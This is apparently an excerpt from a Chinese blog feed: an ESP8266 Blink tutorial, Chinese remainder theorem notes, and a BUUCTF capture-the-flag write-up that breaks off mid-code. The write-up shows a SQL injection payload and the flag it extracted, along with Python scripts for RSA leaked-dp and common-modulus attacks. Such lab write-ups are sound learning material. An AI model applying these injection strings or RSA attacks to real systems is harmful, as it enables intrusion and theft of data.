        <content type="html"><![CDATA[<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>让esp8266的LED灯一闪一闪的…<br>在Arduino中配置好，根据自己的配置…</p><p>工具-开发板-··NodeMCU 1.0</p><p>工具-端口-COM4(我的是COM4…)</p><p>下面这段代码就是文件-示例-Basics-Blink</p><p>一定要注意加上一行代码<code>#define LED_BUILTIN 2</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Blink</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Turns an LED on for one second, then off for one second, repeatedly.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Most Arduinos have an on-board LED you can control. On the UNO, MEGA and ZERO</span></span><br><span class="line"><span class="comment">  it is attached to digital pin 13, on MKR1000 on pin 6. LED_BUILTIN is set to</span></span><br><span class="line"><span class="comment">  the correct LED pin independent of which board is used.</span></span><br><span class="line"><span class="comment">  If you want to know what pin the on-board LED is connected to on your Arduino</span></span><br><span class="line"><span class="comment">  model, check the Technical Specs of your board at:</span></span><br><span class="line"><span class="comment">  https://www.arduino.cc/en/Main/Products</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  modified 8 May 2014</span></span><br><span class="line"><span class="comment">  by Scott Fitzgerald</span></span><br><span class="line"><span class="comment">  modified 2 Sep 2016</span></span><br><span class="line"><span class="comment">  by Arturo Guadalupi</span></span><br><span class="line"><span class="comment">  modified 8 Sep 2016</span></span><br><span class="line"><span class="comment">  by Colby Newman</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  This example code is in the public domain.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  http://www.arduino.cc/en/Tutorial/Blink</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LED_BUILTIN 2</span></span><br><span class="line"><span class="comment">// the setup function runs once when you press reset or power the board</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// initialize digital pin LED_BUILTIN as an output.</span></span><br><span class="line">  pinMode(LED_BUILTIN, OUTPUT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// the loop function runs over and over again forever</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  digitalWrite(LED_BUILTIN, HIGH);   <span class="comment">// turn the LED on (HIGH is the voltage level)</span></span><br><span class="line">  delay(<span class="number">1000</span>);                       <span class="comment">// wait for a second</span></span><br><span class="line">  digitalWrite(LED_BUILTIN, LOW);    <span class="comment">// turn the LED off by making the voltage LOW</span></span><br><span class="line">  delay(<span class="number">1000</span>);                       <span class="comment">// wait for a second</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，项目-上传</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>完美图解物联网IoT实操. ESP8266 Arduino，Cordova物联网移动App， JavaScript微控制器编程 / 赵英杰著.—北京：电子工业出版社，2018.9</li></ul>]]></content>
      
      
      <categories>
          
          <category> esp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> esp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中国剩余定理笔记</title>
      <link href="/blog/algorithm-chinese-remainder-theorem/"/>
      <url>/blog/algorithm-chinese-remainder-theorem/</url>
      
        <content type="html"><![CDATA[<h2 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h2><p>$\left\{\begin{matrix}x\equiv a_1\bmod m_1\\ x\equiv a_2\bmod m_2\\ … \\x\equiv a_n\bmod m_n\end{matrix}\right.$<br>其中$m_i$两两互质<br>$M=\prod_{i=0}^{n}m_i, M_i=\frac{M}{m_i}$<br>$x=\sum_{i=0}^{n}a_i M_i M_i^{-1}\pmod {m_i}$</p><h2 id="扩展中国剩余定理"><a href="#扩展中国剩余定理" class="headerlink" title="扩展中国剩余定理"></a>扩展中国剩余定理</h2><p>模数不互质的时候<br>$x\equiv a_1\bmod m_1$<br>$x\equiv a_2\bmod m_2$<br>也就是<br>$x=k_1m_1+a_1=k_2m_2+a_2$<br>$\therefore k_1m_1=(a_2-a_1)+k_2m_2$<br>即$k_1m_2\equiv (a_2-a_1)\bmod m_2$<br>让$d=(m_1,m_2)$<br>即$k_1\frac{m_1}{d}\equiv \frac{(a_2-a_1)}{d}\bmod {\frac{m_2}{d}}$<br>这样就可以得到$k_1=k’\frac{m_2}{d}+\frac{a_2-a_1}{d}(\frac{m_1}{d})^{-1}\pmod {\frac{m_2}{d}}$<br>令$t=\frac{a_2-a_1}{d}(\frac{m_1}{d})^{-1}\pmod {\frac{m_2}{d}}$<br>带回原式得$x=(k’\frac{m_2}{d}+t)m_1+a_1$<br>即可并成$x=k’\frac{m_1m_2}{d}+tm_1+a_1$<br>即$x\equiv a\bmod m$，其中$a=tm_1+a_1, m=\frac{m_1m_2}{d}$</p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> chinese-remainder-theorem </tag>
            
            <tag> gcd </tag>
            
            <tag> math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF WriteUP</title>
      <link href="/blog/ctf-buuctf/"/>
      <url>/blog/ctf-buuctf/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>说声抱歉…可能要弃坑了呢</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p>不知道为啥一开始注的时候一直成功不了，不知道有啥毛病…<br>最后<code>&#39; or 1=1;#</code>就成功了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(38) &quot;flag&#123;3fy145hzdo5ryeho9za94r0qnbkvha0g&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3fy145hzdo5ryeho9za94r0qnbkvha0g&#125;</span><br></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="连上就有flag的pwn"><a href="#连上就有flag的pwn" class="headerlink" title="连上就有flag的pwn"></a>连上就有flag的pwn</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc buuoj.cn 6000</span><br><span class="line"></span><br><span class="line">flag&#123;2e54332c-bad2-4f2f-aaa9-49364f9edcf4&#125;</span><br></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="看我回旋踢"><a href="#看我回旋踢" class="headerlink" title="看我回旋踢"></a>看我回旋踢</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#125;</span><br></pre></td></tr></table></figure><p>简单的移位恺撒密码<br><a href="https://planetcalc.com/1434/" target="_blank" rel="noopener">https://planetcalc.com/1434/</a><br>ROT13<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5cd1004d-86a5-46d8-b720-beb5ba0417e1&#125;</span><br></pre></td></tr></table></figure></p><h3 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">加密密文：afZ_r9VYfScOeO_UL^RWUc</span><br><span class="line">格式：flag&#123; &#125;</span><br></pre></td></tr></table></figure><p>输出一下对应的ASCII码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">97 102 90 95 114 57 86 89 102 83 99 79 101 79 95 85 76 94 82 87 85 99 </span><br><span class="line">102 108 97 103</span><br></pre></td></tr></table></figure></p><p>前4位和<code>flag</code>相比依次少了$5,6,7,8$<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">t=<span class="string">'afZ_r9VYfScOeO_UL^RWUc'</span></span><br><span class="line">j=<span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> t:</span><br><span class="line">    print(chr(ord(i)+j), end=<span class="string">''</span>)</span><br><span class="line">    j += <span class="number">1</span></span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Caesar_variation&#125;</span><br></pre></td></tr></table></figure><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e00cf25ad42683b3df678c61f42c6bda</span><br></pre></td></tr></table></figure><p>cmd5查一下<br><a href="https://www.cmd5.com/" target="_blank" rel="noopener">https://www.cmd5.com/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;admin1&#125;</span><br></pre></td></tr></table></figure><h3 id="Url编码"><a href="#Url编码" class="headerlink" title="Url编码"></a>Url编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%66%6c%61%67%7b%61%6e%64%20%31%3d%31%7d</span><br></pre></td></tr></table></figure><p><a href="http://web.chacuo.net/charseturlencode" target="_blank" rel="noopener">http://web.chacuo.net/charseturlencode</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;and 1=1&#125;</span><br></pre></td></tr></table></figure></p><h3 id="Quoted-printable"><a href="#Quoted-printable" class="headerlink" title="Quoted-printable"></a>Quoted-printable</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6</span><br></pre></td></tr></table></figure><p><a href="http://web.chacuo.net/charsetquotedprintable" target="_blank" rel="noopener">http://web.chacuo.net/charsetquotedprintable</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;那你也很棒哦&#125;</span><br></pre></td></tr></table></figure></p><h3 id="password"><a href="#password" class="headerlink" title="password"></a>password</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ÐÕÃû£ºÕÅÈý </span><br><span class="line">ÉúÈÕ£º19900315</span><br><span class="line"></span><br><span class="line">keyžñÊœÎªkey&#123;xxxxxxxxxx&#125;</span><br></pre></td></tr></table></figure><p>一看就是编码错误<br>GBK to UTF-8<br><a href="https://www.dedemao.com/convert/#" target="_blank" rel="noopener">https://www.dedemao.com/convert/#</a><br>解码后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">姓名：张三 </span><br><span class="line">生日：19900315</span><br><span class="line"></span><br><span class="line">key格式为key&#123;xxxxxxxxxx&#125;</span><br></pre></td></tr></table></figure></p><p>提交的时候并不是key<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;zs19900315&#125;</span><br></pre></td></tr></table></figure></p><h3 id="摩丝"><a href="#摩丝" class="headerlink" title="摩丝"></a>摩丝</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.. .-.. --- ...- . -.-- --- ..-</span><br></pre></td></tr></table></figure><p><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" target="_blank" rel="noopener">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ILOVEYOU&#125;</span><br></pre></td></tr></table></figure></p><h3 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p =  9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br><span class="line">q =  11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br><span class="line">e =  65537</span><br><span class="line">c =  83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br><span class="line"></span><br><span class="line">Use RSA to find the secret message</span><br></pre></td></tr></table></figure><p>直接计算$d$和$m$即可，不需要再编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex,b2a_hex</span><br><span class="line"></span><br><span class="line">p =  gp.mpz(<span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span>)</span><br><span class="line"></span><br><span class="line">q =  gp.mpz(<span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span>)</span><br><span class="line">e =  gp.mpz(<span class="number">65537</span>)</span><br><span class="line">c =  gp.mpz(<span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span>)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">d = gp.invert(e, phi)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line"></span><br><span class="line">print(m)</span><br><span class="line"><span class="comment"># print(hex(m)[2:])</span></span><br><span class="line"><span class="comment"># print(bytes.fromhex(hex(m)[2:]))</span></span><br></pre></td></tr></table></figure><p>解得<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5577446633554466577768879988&#125;</span><br></pre></td></tr></table></figure></p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ÔÚÒ»ŽÎRSAÃÜÔ¿¶ÔÉú³ÉÖÐ£¬ŒÙÉèp=473398607161£¬q=4511491£¬e=17</span><br><span class="line">Çóœâ³öd×÷ÎªflgaÌáœ»</span><br></pre></td></tr></table></figure><p>GBK to UTF-8<br><a href="https://www.dedemao.com/convert/#" target="_blank" rel="noopener">https://www.dedemao.com/convert/#</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17</span><br><span class="line">求解出d作为flga提交</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"></span><br><span class="line">p = gp.mpz(<span class="number">473398607161</span>)</span><br><span class="line">q = gp.mpz(<span class="number">4511491</span>)</span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gp.invert(e, phi)</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">125631357777427553</span><br></pre></td></tr></table></figure><h3 id="RSA2"><a href="#RSA2" class="headerlink" title="RSA2"></a>RSA2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e = 65537</span><br><span class="line">n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span><br><span class="line">dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span><br><span class="line"></span><br><span class="line">c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span><br></pre></td></tr></table></figure><p>这道题一开始不会做的..<br>都不知道dp啥意思…<br>$dp\equiv d \bmod \varphi(p)$</p><p>$e\times dp\equiv ed \bmod \varphi(p)$<br>$ed=k\varphi(p)+edp$<br>$ed=(k\varphi(p)+edp)\equiv 1\bmod \varphi(n)$ 这步是我没有想到的…感觉这步相当妙啊<br>$k\varphi(p)+edp=k’(p-1)(q-1)+1$<br>移项得<br>$(p-1)(k’(q-1)-k)+1=edp$<br>$\because dp&lt;(p-1)$<br>$\therefore e=65537&gt;(k’(q-1)-k)=x$<br>然后枚举$x$就可以计算得出$p-1$<br>根据$n$可以算出所有的值了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = gp.mpz(<span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span>)</span><br><span class="line">dp = gp.mpz(<span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span>)</span><br><span class="line"></span><br><span class="line">c = gp.mpz(<span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, e):</span><br><span class="line">    <span class="keyword">if</span>(e*dp%x==<span class="number">1</span>):</span><br><span class="line">        p=(e*dp<span class="number">-1</span>)//x+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(n%p!=<span class="number">0</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        q=n//p</span><br><span class="line">        phin=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">        d=gp.invert(e, phin)</span><br><span class="line">        m=gp.powmod(c, d, n)</span><br><span class="line">        <span class="keyword">if</span>(len(hex(m)[<span class="number">2</span>:])%<span class="number">2</span>==<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        print(<span class="string">'--------------'</span>)</span><br><span class="line">        print(m)</span><br><span class="line">        print(hex(m)[<span class="number">2</span>:])</span><br><span class="line">        print(bytes.fromhex(hex(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">print('--------------')</span></span><br><span class="line"><span class="string">print(m)</span></span><br><span class="line"><span class="string">print(hex(m)[2:])</span></span><br><span class="line"><span class="string">print(bytes.fromhex(hex(m)[2:]))</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p><p>最后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3670434958110785066911905751469631231338751225710158680692616521935747246580688484040488309932916523151997</span><br><span class="line">666c61677b776f775f6c65616b696e675f64705f627265616b735f7273613f5f39383932343734333530327d</span><br><span class="line">b&apos;flag&#123;wow_leaking_dp_breaks_rsa?_98924743502&#125;&apos;</span><br></pre></td></tr></table></figure></p><h3 id="RSA3"><a href="#RSA3" class="headerlink" title="RSA3"></a>RSA3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c1=22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span><br><span class="line">n=22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span><br><span class="line">e1=11187289</span><br><span class="line">c2=18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span><br><span class="line">e2=9647291</span><br></pre></td></tr></table></figure><p>共模攻击</p><ul><li>攻击条件 当两个用户使用相同的模数 $N$、不同的私钥时，加密同一明文消息时即存在共模攻击。</li></ul><p>攻击原理<br>设两个用户的公钥分别为<br>$e_1$和$e_2$，且两者互质。明文消息为$m$，密文分别为：<script type="math/tex">c_1 = m^{e_1}\bmod N \\c_2 = m^{e_2}\bmod N</script></p><p>当攻击者截获 $c_1$ 和 $c_2$<br> 后，就可以恢复出明文。用扩展欧几里得算法求出 $re_1+se_2=1\bmod n$<br>的两个整数 $r$ 和 $s$，由此可得：</p><script type="math/tex; mode=display">\begin{align*}c_{1}^{r}c_{2}^{s} &\equiv m^{re_1}m^{se_2}\bmod n\\&\equiv m^{(re_1+se_2)} \bmod n\\&\equiv m\bmod n\end{align*}</script><p><a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_module_attack/#_6" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_module_attack/#_6</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exgcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    x2, y2, r = exgcd(b, a%b)</span><br><span class="line">    x1 = y2</span><br><span class="line">    y1 = x2-(a//b)*y2</span><br><span class="line">    <span class="keyword">return</span> x1, y1, r</span><br><span class="line"></span><br><span class="line">c1=gp.mpz(<span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span>)</span><br><span class="line">n=gp.mpz(<span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span>)</span><br><span class="line">e1=gp.mpz(<span class="number">11187289</span>)</span><br><span class="line">c2=gp.mpz(<span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span>)</span><br><span class="line">e2=gp.mpz(<span class="number">9647291</span>)</span><br><span class="line"></span><br><span class="line">r1, r2, t = exgcd(e1, e2)</span><br><span class="line">m = gp.powmod(c1, r1, n) * gp.powmod(c2, r2, n) % n</span><br><span class="line">print(m)</span><br><span class="line">print(hex(m)[<span class="number">2</span>:])</span><br><span class="line">print(bytes.fromhex(str(hex(m)[<span class="number">2</span>:])))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 